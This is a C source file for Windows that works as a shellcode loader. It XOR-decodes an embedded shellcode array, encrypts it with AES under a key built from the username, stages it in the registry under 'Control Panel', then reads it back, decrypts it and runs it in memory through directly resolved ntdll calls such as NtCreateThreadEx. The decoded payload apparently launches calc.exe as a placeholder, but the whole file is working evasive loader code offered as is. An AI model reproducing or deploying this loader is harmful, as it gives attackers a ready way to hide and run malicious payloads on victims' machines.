
#include <windows.h>
#include <stdio.h>
#include <Lmcons.h> // for UNLEN
#include <stdlib.h>
#include <bcrypt.h>
#pragma comment(lib, "bcrypt.lib")

typedef struct _PS_ATTRIBUTE {
    ULONG Attribute;
    SIZE_T Size;
    union {
        ULONG Value;
        PVOID ValuePtr;
    } u1;
    PSIZE_T ReturnLength;
} PS_ATTRIBUTE, * PPS_ATTRIBUTE;

typedef struct _PS_ATTRIBUTE_LIST {
    SIZE_T TotalLength;
    PS_ATTRIBUTE Attributes[1];
} PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG           Length;
    HANDLE          RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG           Attributes;
    PVOID           SecurityDescriptor;
    PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

typedef struct _CLIENT_ID {
    PVOID UniqueProcess;
    PVOID UniqueThread;
} CLIENT_ID, * PCLIENT_ID;

// Define prototypes with proper calling convention
typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
    );

typedef NTSTATUS(NTAPI* pNtProtectVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T NumberOfBytesToProtect,
    ULONG NewAccessProtection,
    PULONG OldAccessProtection
    );

typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PPS_ATTRIBUTE_LIST AttributeList
    );

typedef NTSTATUS(NTAPI* pNtWaitForSingleObject)(
    HANDLE Handle,
    BOOLEAN Alertable,
    PLARGE_INTEGER Timeout
    );

typedef NTSTATUS(NTAPI* pNtFreeVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG FreeType
    );

typedef NTSTATUS(NTAPI* pNtClose)(
    HANDLE Handle
    );

// Function to get NTDLL function address
PVOID GetNtdllFunction(LPCSTR FunctionName) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        return NULL;
    }
    return GetProcAddress(hNtdll, FunctionName);
}

// Pre XOR'd shellcode
const BYTE shellcode[] = {
      0xb7, 0x03, 0xc8, 0xaf, 0xbb, 0xa3, 0x8b, 0x4b, 0x4b, 0x4b, 0x0a, 0x1a, 0x0a, 0x1b, 0x19,
    0x1a, 0x1d, 0x03, 0x7a, 0x99, 0x2e, 0x03, 0xc0, 0x19, 0x2b, 0x03, 0xc0, 0x19, 0x53, 0x03,
    0xc0, 0x19, 0x6b, 0x03, 0xc0, 0x39, 0x1b, 0x03, 0x44, 0xfc, 0x01, 0x01, 0x06, 0x7a, 0x82,
    0x03, 0x7a, 0x8b, 0xe7, 0x77, 0x2a, 0x37, 0x49, 0x67, 0x6b, 0x0a, 0x8a, 0x82, 0x46, 0x0a,
    0x4a, 0x8a, 0xa9, 0xa6, 0x19, 0x0a, 0x1a, 0x03, 0xc0, 0x19, 0x6b, 0xc0, 0x09, 0x77, 0x03,
    0x4a, 0x9b, 0xc0, 0xcb, 0xc3, 0x4b, 0x4b, 0x4b, 0x03, 0xce, 0x8b, 0x3f, 0x2c, 0x03, 0x4a,
    0x9b, 0x1b, 0xc0, 0x03, 0x53, 0x0f, 0xc0, 0x0b, 0x6b, 0x02, 0x4a, 0x9b, 0xa8, 0x1d, 0x03,
    0xb4, 0x82, 0x0a, 0xc0, 0x7f, 0xc3, 0x03, 0x4a, 0x9d, 0x06, 0x7a, 0x82, 0x03, 0x7a, 0x8b,
    0xe7, 0x0a, 0x8a, 0x82, 0x46, 0x0a, 0x4a, 0x8a, 0x73, 0xab, 0x3e, 0xba, 0x07, 0x48, 0x07,
    0x6f, 0x43, 0x0e, 0x72, 0x9a, 0x3e, 0x93, 0x13, 0x0f, 0xc0, 0x0b, 0x6f, 0x02, 0x4a, 0x9b,
    0x2d, 0x0a, 0xc0, 0x47, 0x03, 0x0f, 0xc0, 0x0b, 0x57, 0x02, 0x4a, 0x9b, 0x0a, 0xc0, 0x4f,
    0xc3, 0x03, 0x4a, 0x9b, 0x0a, 0x13, 0x0a, 0x13, 0x15, 0x12, 0x11, 0x0a, 0x13, 0x0a, 0x12,
    0x0a, 0x11, 0x03, 0xc8, 0xa7, 0x6b, 0x0a, 0x19, 0xb4, 0xab, 0x13, 0x0a, 0x12, 0x11, 0x03,
    0xc0, 0x59, 0xa2, 0x1c, 0xb4, 0xb4, 0xb4, 0x16, 0x03, 0xf1, 0x4a, 0x4b, 0x4b, 0x4b, 0x4b,
    0x4b, 0x4b, 0x4b, 0x03, 0xc6, 0xc6, 0x4a, 0x4a, 0x4b, 0x4b, 0x0a, 0xf1, 0x7a, 0xc0, 0x24,
    0xcc, 0xb4, 0x9e, 0xf0, 0xbb, 0xfe, 0xe9, 0x1d, 0x0a, 0xf1, 0xed, 0xde, 0xf6, 0xd6, 0xb4,
    0x9e, 0x03, 0xc8, 0x8f, 0x63, 0x77, 0x4d, 0x37, 0x41, 0xcb, 0xb0, 0xab, 0x3e, 0x4e, 0xf0,
    0x0c, 0x58, 0x39, 0x24, 0x21, 0x4b, 0x12, 0x0a, 0xc2, 0x91, 0xb4, 0x9e, 0x28, 0x2a, 0x27,
    0x28, 0x65, 0x2e, 0x33, 0x2e, 0x4b
};

const DWORD shellcodeSize = sizeof(shellcode);

// AES Configuration
#define AES_KEY_LENGTH 16  // 128-bit AES
#define AES_BLOCK_SIZE 16

// Generate encryption key from environment
BOOL GenerateKeyFromEnvironment(BYTE* key, DWORD keySize) {
    CHAR username[UNLEN + 1];
    DWORD usernameLen = UNLEN + 1;

    if (!GetUserNameA(username, &usernameLen)) {
        printf("Failed to get username: %d\n", GetLastError());
        return FALSE;
    }

    BYTE padding = 0x01;
    for (DWORD i = 0; i < keySize; i++) {
        if (i < usernameLen) {
            key[i] = (BYTE)username[i];
        }
        else {
            key[i] = padding++;
        }
    }
    return TRUE;
}

// AES encrypt
BOOL AESEncrypt(const BYTE* plaintext, DWORD plaintextSize, const BYTE* key,
    BYTE** ciphertext, DWORD* ciphertextSize) {
    BCRYPT_ALG_HANDLE hAlgorithm = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS status;

    // Open AES provider
    status = BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_AES_ALGORITHM,
        NULL, 0);
    if (status != 0) {
        printf("BCryptOpenAlgorithmProvider failed: 0x%x\n", status);
        return FALSE;
    }

    // Set ECB mode
    status = BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE,
        (BYTE*)BCRYPT_CHAIN_MODE_ECB,
        sizeof(BCRYPT_CHAIN_MODE_ECB), 0);
    if (status != 0) {
        BCryptCloseAlgorithmProvider(hAlgorithm, 0);
        printf("BCryptSetProperty failed: 0x%x\n", status);
        return FALSE;
    }

    // Create key handle
    status = BCryptGenerateSymmetricKey(hAlgorithm, &hKey, NULL, 0,
        (BYTE*)key, AES_KEY_LENGTH, 0);
    if (status != 0) {
        BCryptCloseAlgorithmProvider(hAlgorithm, 0);
        printf("BCryptGenerateSymmetricKey failed: 0x%x\n", status);
        return FALSE;
    }

    // Get output buffer size
    DWORD cbCiphertext = 0;
    status = BCryptEncrypt(hKey, (BYTE*)plaintext, plaintextSize, NULL,
        NULL, 0, NULL, 0, &cbCiphertext, BCRYPT_BLOCK_PADDING);
    if (status != 0) {
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlgorithm, 0);
        printf("BCryptEncrypt size check failed: 0x%x\n", status);
        return FALSE;
    }

    // Allocate ciphertext buffer
    *ciphertext = (BYTE*)malloc(cbCiphertext);
    if (!*ciphertext) {
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlgorithm, 0);
        printf("Memory allocation failed\n");
        return FALSE;
    }

    // Perform encryption
    status = BCryptEncrypt(hKey, (BYTE*)plaintext, plaintextSize, NULL,
        NULL, 0, *ciphertext, cbCiphertext,
        ciphertextSize, BCRYPT_BLOCK_PADDING);
    if (status != 0) {
        free(*ciphertext);
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlgorithm, 0);
        printf("BCryptEncrypt failed: 0x%x\n", status);
        return FALSE;
    }

    // Cleanup
    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlgorithm, 0);
    return TRUE;
}

// AES decrypt
BOOL AESDecrypt(const BYTE* ciphertext, DWORD ciphertextSize, const BYTE* key,
    BYTE** plaintext, DWORD* plaintextSize) {
    BCRYPT_ALG_HANDLE hAlgorithm = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS status;

    // Open AES provider
    status = BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_AES_ALGORITHM,
        NULL, 0);
    if (status != 0) {
        printf("BCryptOpenAlgorithmProvider failed: 0x%x\n", status);
        return FALSE;
    }

    // Set ECB mode
    status = BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE,
        (BYTE*)BCRYPT_CHAIN_MODE_ECB,
        sizeof(BCRYPT_CHAIN_MODE_ECB), 0);
    if (status != 0) {
        BCryptCloseAlgorithmProvider(hAlgorithm, 0);
        printf("BCryptSetProperty failed: 0x%x\n", status);
        return FALSE;
    }

    // Create key handle
    status = BCryptGenerateSymmetricKey(hAlgorithm, &hKey, NULL, 0,
        (BYTE*)key, AES_KEY_LENGTH, 0);
    if (status != 0) {
        BCryptCloseAlgorithmProvider(hAlgorithm, 0);
        printf("BCryptGenerateSymmetricKey failed: 0x%x\n", status);
        return FALSE;
    }

    // Get output buffer size
    DWORD cbPlaintext = 0;
    status = BCryptDecrypt(hKey, (BYTE*)ciphertext, ciphertextSize, NULL,
        NULL, 0, NULL, 0, &cbPlaintext, BCRYPT_BLOCK_PADDING);
    if (status != 0) {
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlgorithm, 0);
        printf("BCryptDecrypt size check failed: 0x%x\n", status);
        return FALSE;
    }

    // Allocate plaintext buffer
    *plaintext = (BYTE*)malloc(cbPlaintext);
    if (!*plaintext) {
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlgorithm, 0);
        printf("Memory allocation failed\n");
        return FALSE;
    }

    // Perform decryption
    status = BCryptDecrypt(hKey, (BYTE*)ciphertext, ciphertextSize, NULL,
        NULL, 0, *plaintext, cbPlaintext,
        plaintextSize, BCRYPT_BLOCK_PADDING);
    if (status != 0) {
        free(*plaintext);
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlgorithm, 0);
        printf("BCryptDecrypt failed: 0x%x\n", status);
        return FALSE;
    }

    // Cleanup
    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlgorithm, 0);
    return TRUE;
}

BOOL writeRegistry(const BYTE* data, DWORD dataSize, const char* valueName) {
    HKEY hKey;
    LONG status = RegOpenKeyExA(HKEY_CURRENT_USER, "Control Panel", 0, KEY_SET_VALUE, &hKey);
    if (status != ERROR_SUCCESS) {
        printf("Error opening key: %d\n", GetLastError());
        return FALSE;
    }

    status = RegSetValueExA(hKey, valueName, 0, REG_BINARY, data, dataSize);
    RegCloseKey(hKey);

    if (status != ERROR_SUCCESS) {
        printf("Error writing value: %d\n", GetLastError());
        return FALSE;
    }

    return TRUE;
}

BOOL readRegistry(BYTE** buffer, DWORD* bytesRead, const char* valueName) {
    HKEY hKey;
    LONG status = RegOpenKeyExA(HKEY_CURRENT_USER, "Control Panel", 0, KEY_READ, &hKey);
    if (status != ERROR_SUCCESS) {
        printf("Error opening key: %d\n", GetLastError());
        return FALSE;
    }

    DWORD type, size = 0;
    status = RegQueryValueExA(hKey, valueName, NULL, &type, NULL, &size);
    if (status != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        printf("Error querying value size: %d\n", GetLastError());
        return FALSE;
    }

    *buffer = (BYTE*)malloc(size);
    if (!*buffer) {
        RegCloseKey(hKey);
        printf("Memory allocation failed\n");
        return FALSE;
    }

    status = RegQueryValueExA(hKey, valueName, NULL, &type, *buffer, &size);
    RegCloseKey(hKey);

    if (status != ERROR_SUCCESS) {
        free(*buffer);
        printf("Error reading value: %d\n", GetLastError());
        return FALSE;
    }

    *bytesRead = size;
    return TRUE;
}

// Add this XOR decoding function
void XORDecode(BYTE* data, DWORD dataSize, BYTE key) {
    for (DWORD i = 0; i < dataSize; i++) {
        data[i] ^= key;
    }
}

void ExecuteShellcode(BYTE* shellcode, SIZE_T size) {
    XORDecode(shellcode, size, 'K');
    // Get function pointers
    pNtAllocateVirtualMemory NtAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetNtdllFunction("NtAllocateVirtualMemory");
    pNtProtectVirtualMemory NtProtectVirtualMemory = (pNtProtectVirtualMemory)GetNtdllFunction("NtProtectVirtualMemory");
    pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)GetNtdllFunction("NtCreateThreadEx");
    pNtWaitForSingleObject NtWaitForSingleObject = (pNtWaitForSingleObject)GetNtdllFunction("NtWaitForSingleObject");
    pNtFreeVirtualMemory NtFreeVirtualMemory = (pNtFreeVirtualMemory)GetNtdllFunction("NtFreeVirtualMemory");
    pNtClose NtClose = (pNtClose)GetNtdllFunction("NtClose");

    if (!NtAllocateVirtualMemory || !NtProtectVirtualMemory || !NtCreateThreadEx ||
        !NtWaitForSingleObject || !NtFreeVirtualMemory || !NtClose) {
        printf("Failed to get NTDLL function pointers\n");
        return;
    }

    PVOID execMemory = NULL;
    SIZE_T regionSize = size;
    ULONG oldProtect;

    // Allocate memory
    NTSTATUS status = NtAllocateVirtualMemory(
        GetCurrentProcess(),
        &execMemory,
        0,
        &regionSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (status != 0) {
        printf("NtAllocateVirtualMemory failed: 0x%x\n", status);
        return;
    }

    // Copy shellcode
    memcpy(execMemory, shellcode, size);

    // Change protection
    status = NtProtectVirtualMemory(
        GetCurrentProcess(),
        &execMemory,
        &size,
        PAGE_EXECUTE_READ,
        &oldProtect
    );

    if (status != 0) {
        printf("NtProtectVirtualMemory failed: 0x%x\n", status);
        NtFreeVirtualMemory(GetCurrentProcess(), &execMemory, &size, MEM_RELEASE);
        return;
    }

    // Create thread
    HANDLE hThread = NULL;
    status = NtCreateThreadEx(
        &hThread,
        THREAD_ALL_ACCESS,
        NULL,
        GetCurrentProcess(),
        (LPTHREAD_START_ROUTINE)execMemory,
        NULL,
        0,
        0,
        0,
        0,
        NULL
    );

    if (status != 0) {
        printf("NtCreateThreadEx failed: 0x%x\n", status);
        NtFreeVirtualMemory(GetCurrentProcess(), &execMemory, &size, MEM_RELEASE);
        return;
    }

    // Wait for thread
    status = NtWaitForSingleObject(hThread, FALSE, NULL);
    if (status != 0) {
        printf("NtWaitForSingleObject failed: 0x%x\n", status);
    }

    // Cleanup
    NtClose(hThread);
    NtFreeVirtualMemory(GetCurrentProcess(), &execMemory, &size, MEM_RELEASE);
}

int main() {
    CHAR username[UNLEN + 1];
    DWORD usernameLen = UNLEN + 1;

    if (!GetUserNameA(username, &usernameLen)) {
        printf("Failed to get username: %d\n", GetLastError());
        return 1;
    }

    BYTE key[AES_KEY_LENGTH];
    if (!GenerateKeyFromEnvironment(key, AES_KEY_LENGTH)) {
        return 1;
    }

    // Encrypt payload
    BYTE* encryptedShellcode = NULL;
    DWORD encryptedSize = 0;
    if (!AESEncrypt(shellcode, shellcodeSize, key, &encryptedShellcode, &encryptedSize)) {
        return 1;
    }

    // Write to registry using username as the value name
    if (!writeRegistry(encryptedShellcode, encryptedSize, username)) {
        free(encryptedShellcode);
        return 1;
    }
    free(encryptedShellcode);
    printf("Successfully wrote encrypted payload to registry under key '%s'\n", username);

    // Read from registry using username as the value name
    BYTE* readBuffer = NULL;
    DWORD bytesRead;
    if (!readRegistry(&readBuffer, &bytesRead, username)) {
        return 1;
    }

    // Decrypt payload
    BYTE* decryptedShellcode = NULL;
    DWORD decryptedSize;
    if (!AESDecrypt(readBuffer, bytesRead, key, &decryptedShellcode, &decryptedSize)) {
        free(readBuffer);
        return 1;
    }
    free(readBuffer);

    // Verify decrypted size matches original
    if (decryptedSize != shellcodeSize) {
        printf("Decrypted size mismatch! Expected %d, got %d\n", shellcodeSize, decryptedSize);
        free(decryptedShellcode);
        return 1;
    }

    // Execute the shellcode
    printf("Executing decrypted payload...\n");
    ExecuteShellcode(decryptedShellcode, decryptedSize);
    free(decryptedShellcode);

    return 0;
}